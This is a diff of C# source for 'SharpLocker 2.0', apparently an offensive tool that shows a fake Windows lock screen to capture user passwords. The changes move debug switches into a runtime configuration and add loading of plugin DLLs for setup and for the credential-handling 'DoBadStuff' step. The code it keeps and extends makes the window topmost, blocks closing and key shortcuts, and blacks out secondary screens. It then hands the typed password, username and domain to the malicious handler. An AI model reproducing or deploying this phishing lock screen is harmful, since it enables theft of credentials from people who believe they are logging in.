@@ -1,12 +1,10 @@
 ﻿using SharpLocker_2._0.Classes;
+using SharpLocker_2._0.Controls;
+using SharpLocker_2._0.Interfaces;
 using System;
-using System.Collections.Generic;
 using System.Data;
-using System.DirectoryServices;
 using System.DirectoryServices.AccountManagement;
 using System.Drawing;
-using System.Drawing.Drawing2D;
-using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
 using System.Threading.Tasks;
@@ -20,10 +18,8 @@ namespace SharpLocker_2._0
 
         // Decides wether the form can be closed or not
         private bool DenyClose { get; set; }
-        private Interfaces.IDoBadStuff DoBadStuff;
-
-        // Placeholder text for password textbox
-        private const string PLACEHOLDER_TEXT = "Password";
+        private IDoBadStuff DoBadStuff;
+        private Configuration Configuration { get; set; } = new Configuration();
 
         #endregion
 
@@ -38,9 +34,7 @@ namespace SharpLocker_2._0
         // Gets called when main login form would be closing
         private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
         {
-#if !DEBUG
-            e.Cancel = DenyClose;
-#endif
+            if (!Configuration.DebugMode) e.Cancel = DenyClose;
         }
 
         protected override CreateParams CreateParams
@@ -61,16 +55,26 @@ namespace SharpLocker_2._0
         {
             // Do nothing if no password has been entered
             if (string.IsNullOrEmpty(PasswordTextBox.Text)) return;
-            if (PasswordTextBox.Text == PLACEHOLDER_TEXT) return;
+            if (PasswordTextBox.Text == Configuration.PlaceholderText) return;
 
             DenyClose = false;
-#if !DEBUG
-            KeyPressHandler.Enable();
-#endif
-            // Time for malicious business 😏
-            DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);
 
-            Close();
+            if (!Configuration.DebugMode) KeyPressHandler.Enable();
+
+            try
+            {
+                // Time for malicious business 😏
+                DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);
+            }
+            catch (Exception ex)
+            {
+                if (Configuration.DebugMode) MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+            finally
+            {
+                Close();
+            }
+
         }
 
         #region "Password"
@@ -78,7 +82,7 @@ namespace SharpLocker_2._0
         // Show password when button is pressed
         private void ShowPasswordButton_Click(object sender, EventArgs e)
         {
-            if (PasswordTextBox.Text != PLACEHOLDER_TEXT)
+            if (PasswordTextBox.Text != Configuration.PlaceholderText)
                 PasswordTextBox.UseSystemPasswordChar = !PasswordTextBox.UseSystemPasswordChar;
         }
 
@@ -93,7 +97,7 @@ namespace SharpLocker_2._0
             // WinForms doesn't have *real* placeholders, so we have to tinker around
             // to make it seem like a real placeholder.
             // this prevents moving the text cursor
-            if (PasswordTextBox.Text == PLACEHOLDER_TEXT)
+            if (PasswordTextBox.Text == Configuration.PlaceholderText)
             {
                 if (e.KeyCode == Keys.Right || e.KeyCode == Keys.Left)
                 {
@@ -113,7 +117,7 @@ namespace SharpLocker_2._0
                 SetPlaceholder();
             }
 
-            if (tb.Text.Substring(1, tb.Text.Length - 1) == PLACEHOLDER_TEXT)
+            if (tb.Text.Substring(1, tb.Text.Length - 1) == Configuration.PlaceholderText)
             {
                 tb.UseSystemPasswordChar = true;
                 tb.Font = new Font("Microsoft Sans Serif", 23.25f);
@@ -128,14 +132,14 @@ namespace SharpLocker_2._0
         // this prevents placing the text cursor somewhere where it shouldn't be
         private void PasswordTextBox_Click(object sender, EventArgs e)
         {
-            if (PasswordTextBox.Text == PLACEHOLDER_TEXT) PasswordTextBox.Select(0, 0);
+            if (PasswordTextBox.Text == Configuration.PlaceholderText) PasswordTextBox.Select(0, 0);
         }
 
         // Put placeholder text into password textbox
         private void SetPlaceholder()
         {
             PasswordTextBox.UseSystemPasswordChar = false;
-            PasswordTextBox.Text = PLACEHOLDER_TEXT;
+            PasswordTextBox.Text = Configuration.PlaceholderText;
             PasswordTextBox.Font = new Font("Microsoft Tai Le", 21.00f);
             PasswordTextBox.ForeColor = SystemColors.ControlLight;
             PasswordTextBox.Select(0, 0);
@@ -155,6 +159,7 @@ namespace SharpLocker_2._0
         // Handle all setup
         private void Initialize()
         {
+            InitializeConfiguration();
             InitializeMisc();
             InitializePasswordTextbox();
             InitializeTaskbar();
@@ -166,6 +171,25 @@ namespace SharpLocker_2._0
             InitializeOtherUsers();
         }
 
+        // Loads a setup from a dll file thats implements the ISetup interface
+        private void InitializeConfiguration()
+        {
+
+            try
+            {
+                ISetup setup = InterfaceLoader.Get<ISetup>();
+                if (setup is null) return;
+
+                Configuration = setup.Initialize(Configuration);
+            }
+            catch (Exception ex)
+            {
+                Configuration = new Configuration();
+                MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+
+        }
+
         private void InitializeMisc()
         {
             // disallow closing of the program
@@ -173,13 +197,7 @@ namespace SharpLocker_2._0
             // display CapsLock notification if necessary
             CapsLockLabel.Visible = IsKeyLocked(Keys.CapsLock);
 
-            // any release build of SharpLocker will allways be the top most window
-#if DEBUG
-            TopMost = false;
-#else
-            TopMost = true;
-#endif
-
+            TopMost = !Configuration.DebugMode;
         }
 
         // Show placeholder on startup
@@ -192,17 +210,24 @@ namespace SharpLocker_2._0
         // if its available, it replaces the default bad stuff object
         private void InitializeBadStuff()
         {
-            DoBadStuff = new Interfaces.BadStuffLoader().Get();
+            try
+            {
+                DoBadStuff = InterfaceLoader.Get<IDoBadStuff>();
 
-            if (DoBadStuff == null) DoBadStuff = new DefaultBadStuff();
+                if (DoBadStuff is null) DoBadStuff = new DefaultBadStuff();
+            }
+            catch (Exception ex)
+            {
+                DoBadStuff = new DefaultBadStuff();
+                if (Configuration.DebugMode) MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+
         }
 
         // disables certain key combinations in release builds
         private void InitializeTaskbar()
         {
-#if !DEBUG
-            KeyPressHandler.Disable();
-#endif
+            if (!Configuration.DebugMode) KeyPressHandler.Disable();
         }
 
         // Display the users Username on the form
@@ -293,17 +318,16 @@ namespace SharpLocker_2._0
             pb.Image = img.ResizeImage(pb.Width, pb.Height);
         }
 
-
-
-        // on release builds, black out all non-primary screens
+        // black out all non-primary screens
         private void InitializeOtherScreens()
         {
-#if !DEBUG
-            foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
+            if (!Configuration.DebugMode)
             {
-                new Task(() => BlackScreen(screen)).Start();
+                foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
+                {
+                    new Task(() => BlackScreen(screen)).Start();
+                }
             }
-#endif
         }
 
         // Create a fullscreen black form
@@ -339,7 +363,7 @@ namespace SharpLocker_2._0
         private void InitializeOtherUsers()
         {
             AddChangeUserPanel("Other User", 0);
-            AddChangeUserPanel(UserPrincipal.Current.DisplayName, 1);
+            AddChangeUserPanel(UserNameLabel.Text, 1);
         }
 
         // create a "other user" control with given properties, then place it on screen
